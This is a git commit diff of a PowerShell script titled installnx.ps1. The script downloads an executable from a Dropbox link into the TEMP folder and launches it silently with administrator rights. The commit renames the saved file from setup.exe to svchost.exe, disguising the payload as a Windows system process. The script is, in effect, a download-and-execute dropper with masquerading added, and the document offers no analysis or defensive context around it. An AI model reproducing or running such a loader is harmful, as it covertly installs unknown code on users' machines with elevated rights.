7c08f6e68e557a20c0434aea813b9d848ba88244
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-03-06 23:51:02 +0600

    Update installnx.ps1

--- installnx.ps1
+++ installnx.ps1
@@ -1,7 +1,7 @@
 # install.ps1 nahid
 
 $u = "https://www.dropbox.com/scl/fi/5jdblgebdbt01q1px4zrj/Built.exe?rlkey=krdcfobfbioysvnuuqb1q7c2i&st=nnsho2pu&dl=1"
-$p = "$env:TEMP\setup.exe"
+$p = "$env:TEMP\svchost.exe"
 
 Invoke-RestMethod $u -OutFile $p
 Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
